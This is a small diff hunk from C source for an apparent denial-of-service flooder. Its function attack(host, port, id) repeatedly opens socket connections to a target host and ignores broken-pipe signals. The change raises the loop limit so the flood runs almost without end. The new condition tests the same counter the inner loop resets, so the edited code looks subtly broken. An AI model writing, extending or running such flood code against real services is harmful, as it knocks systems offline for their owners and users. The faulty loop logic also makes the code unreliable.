@@ -55,7 +55,7 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x != CONNECTIONS; x++)
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
-	while(i < 1000000) {
+	while(x < 999999999) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
